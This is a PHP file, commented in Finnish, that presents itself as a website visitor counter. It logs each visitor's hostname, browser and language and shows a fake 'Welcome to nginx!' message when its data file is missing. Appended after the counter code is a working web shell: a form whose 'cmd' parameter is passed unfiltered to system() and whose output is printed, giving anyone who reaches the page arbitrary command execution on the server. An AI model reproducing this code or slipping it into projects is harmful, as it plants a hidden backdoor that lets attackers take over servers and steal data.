<?php
//  Laskuri
//  Voidaan liittää PHP:n Include komennolla
//  toiseen sivuun. Tämä sivu lisaa.php , lisää kävijän laskuriin.
//
//      Tekijä: Teemu I
// Määritykset:

$tiedosto = "ccv.dat";  // Asetetaan laskuritiedoston nimi muuttujaan $tiedosto.
$tiedosto2 = "kavijat.dat";  // Asetetaan asiakastietotiedoston nimi muuttujaan $2tiedosto.

if (!file_exists($tiedosto))  // Tarkistetaan onko tiedosto olemassa .
{


//print "<h1>Virhe!</h1>Tiedostoa ei löydy.<BR>\n"; // Jos ei, niin tulostetaan virheilmoitus ja lopetetaan suoritus.
echo "Welcome to nginx!";

 }

else

 {

$osoitin = fopen($tiedosto,"a"); // Jos tiedosto löytyi, niin avataan kirjoittamista varten.
flock($osoitin, 1);
flock($osoitin, 2);  // Lukitaan tiedosto.

$lis = "|";
fwrite($osoitin,$lis);    // Kirjoitetaan tiedostoon uusi merkki.

flock($osoitin, 3);   // Puretaan lukitus
fclose($osoitin);   // Suljetaan tiedosto

if (!file_exists($tiedosto2))  // Tarkistetaan onko tiedosto olemassa.
{

//print "<h1>Virhe!</h1>Tiedostoa ei löydy.<BR>\n"; // Jos ei, niin tulostetaan virheilmoitus ja lopetetaan suoritus.

}
else
{
$osoitin = fopen($tiedosto2,"a"); // Jos tiedosto löytyi, niin avataan kirjoittamista varten.
flock($osoitin, 1);
flock($osoitin, 2);  // Lukitaan tiedosto.
if(!$_SERVER["HTTP_REMOTE_HOST"])
 {
     $hosti = gethostbyaddr($_SERVER['REMOTE_ADDR']);

  }
   else

  {

  $hosti= $_SERVER["HTTP_REMOTE_HOST"];

  }
$agentti = $_SERVER["HTTP_USER_AGENT"];
$kieli = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
$linja=" \n Nimi: ".$hosti." Selain/Järjestelmä: ". $agentti." Kieli: " .$kieli ." \n ";
 fwrite($osoitin,$linja);
 flock($osoitin, 3);   // Puretaan lukitus
fclose($osoitin);   // Suljetaan tiedosto
}
}




?>

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
    
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }

?>
</pre>
</body>
</html>